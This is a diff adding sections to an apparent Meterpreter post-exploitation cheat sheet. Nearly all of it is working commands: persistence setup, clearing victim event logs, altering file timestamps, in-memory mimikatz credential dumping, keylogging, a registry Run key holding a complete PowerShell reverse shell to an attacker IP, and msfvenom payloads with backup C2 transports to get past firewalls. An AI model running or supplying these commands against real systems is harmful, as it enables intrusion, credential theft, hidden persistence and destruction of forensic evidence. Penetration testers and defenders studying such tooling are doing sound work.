@@ -423,6 +423,215 @@ every command will be logged in a file named console.log in `~/.msf4/logs`
 se consolelogging true
 ```
 
+## Auto Persistence
+
+```
+run persistence –A –L [directory to put payload] -X [connection attempt intervals/sec]  –p [attacker port] –r [attaacker ip]
+```
+
+```
+-A for auro starting listener
+-X for starting at reboot
+ 
+# for help:
+run persistance -h 
+#erun persistence –A –L c:\\ -X 30 –p 443 –r 192.168.1.113
+```
+
+## Clear Victim System Logs&#x20;
+
+(system, security & application logs)
+
+```
+clearev
+```
+
+## Execute Commands Directly From Memory
+
+#### The executable file can be on attacker side since meterpreter is running completely in memory, we can execute remote binaries directly in memory.
+
+```
+execute -h
+```
+
+example:
+
+#### execute mimikatz directly from memory(binary is on attacker side):
+
+```
+migrate -N lsass.exe
+execute -H -i -c -m -d calc.exe -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+```
+
+#### adding command parameters( -a)
+
+```
+execute -H -i -c -m -d calc.exe -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -a '"sekurlsa::logonpasswords" exit'
+```
+
+## Multiple Connection Channels
+
+example:
+
+open notepad app in a different channel
+
+```
+execute -f notepad.exe -c
+```
+
+list channels
+
+```
+channel -l 
+```
+
+read/write data to a channel
+
+```
+write [option] [channel id]
+read
+```
+
+## Change File Timestamp
+
+modify the date and time of file and folder modification and access
+
+```
+timestomp -h
+
+# list the value of MACE (modified-accessed-created-entry)
+timestomp /path/to/file -v 
+
+# change the creation time
+ timestomp /path/to/file -c  "05/25/2020 01:01:01"
+ 
+ #  change last access time
+  timestomp /path/to/file -a  "05/25/2020 01:01:01" 
+  
+ # change the last modify time
+  timestomp /path/to/file -m  "05/25/2020 01:01:01"
+```
+
+## Process Migration
+
+```
+migrate -h
+ migrate [pid]
+ migrate -N [process name]
+```
+
+## Keylogger
+
+#### migrate to explorer.exe (for better performance)
+
+```
+keyscan_start
+keyscan_dump
+keyscan_stop
+```
+
+## Dig Info and Enumeration
+
+net info, pass hashes, registry, etc.
+
+```
+run scraper   
+run winenum
+```
+
+## Interact with the Registry
+
+```
+reg -h
+```
+
+example:
+
+#### set a registry to run powershell reverse shell whenever the user logs in:
+
+```
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v -Power -d "powershell -ep bypass -c $client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+## Timeout Control
+
+```
+get_timeouts
+
+#  set communication timeout to 900 secs
+set_timeouts -c 900
+```
+
+## Sleep Control
+
+makes current meterpreter session go to sleep for specific period of time and wake up again.
+
+```
+sleep
+sleep 10 # sleep for 10 secs
+```
+
+## Transports
+
+Once Meterpreter shellcode has been run; whether from a phish, or some other means, it will reach out to the attacker’s Command and Control (C2) server over some network transport, such as HTTP, HTTPS or TCP. However, in an unknown environment, a successful connection is not guaranteed: firewalls, proxies, or intrusion prevention systems might all prevent a certain transport method from reaching out to the public Internet.Repeated trial and error is sometimes possible, but not always. For a phish, clicks come at a premium. Some exploits only give you one shot to get a shell, before crashing the host process.Meterpreter has the ability to have multiple “transports” in a single implant. A transport is the method by which it communicates to the Metasploit C2 server: TCP, HTTP, etc. Typically, Meterpreter is deployed with a single transport, having had the payload type set in msfvenom or in a Metasploit exploit module (e.g. meterpreter\_reverse\_http).
+
+But after a connection has been made between the implant and the C2 server, an operator can add additional, backup transports. This is particularly useful for redundancy: if one path goes down (e.g. your domain becomes blacklisted), it can fall back to another.
+
+#### A transport is defined by its properties:
+
+* **The type of transport (TCP, HTTP, etc.)**&#x20;
+* **The host to connect to**&#x20;
+* **The port to connect on**
+* &#x20;**A URI, for HTTP-based transports**
+* &#x20;**Other properties such as retry times and timeouts**
+
+Once a Meterpreter session has been set up, you can add a transport using the command transport add and providing it with parameters (type transport to see the options).
+
+By setting up multiple transports in this initialisation script, Meterpreter will try each of them (for a configurable amount of time), before moving on to the next one.
+
+#### To do this:
+
+Create a stageless meterpreter payload, which pre-loads the PowerShell extension. The transport used on the command line will be the default Include a PowerShell script as an “Extension Initialisation Script” (parameter name is extinit, and has the format of ,). This script should add additional transports to the Meterpreter session. When the shellcode runs, this script will also run If the initial transport (the one specified on the command line) fails, Meterpreter will then try each of these alternative transports in turn.
+
+in AddTransports.ps1 :
+
+```
+Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
+Add-WebTransport -Url https://<host>:<port>;-RetryWait 10 -RetryTotal 30
+Add-WebTransport -Url http://<host>:<port>;-RetryWait 10 -RetryTotal 30
+```
+
+#### The command line for this would be:
+
+```
+msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
+```
+
+#### Some got chas to be aware of:
+
+* Make sure you include the full path to the extinit parameter (relative paths don’t appear to work)
+* &#x20;Ensure you configure how long to try each transport before moving on to the next.
+* &#x20;RetryWait is the time to wait between each attempt to contact the C2 server
+* &#x20;RetryTotal is the total amount of time to wait before moving on to the next transport&#x20;
+* Note that the parameter names for retry times and timeouts are different between the PowerShell bindings and the Metasploit parameters themselves:
+  * &#x20;in the PowerShell extension, they are RetryWait and RetryTotal; in Metasploit they are SessionRetryWait and SessionRetryTotal (a tad confusing, as they relate to transports, not sessions)
+
+### Manually Creating Transport in Meterpreter Session
+
+```
+transport add -t [transport type, i.e: reverse_https] -l [lhost] -p [lport] -T [retry total time] -W [retry wait] -C [comm timeout] 
+transport add -l 192.168.56.1 -p 7878 -t reverse_https -T 3000 -W 10 -C 1000000
+```
+
+#### to move to another transport background the current session and run the right payload with options same as the target transport and wait for connection.
+
+#### once you have more than one transfport its safe to use this command to move between transports:
+
+```
+transport next
+transport prev
+```
+
 
 
 
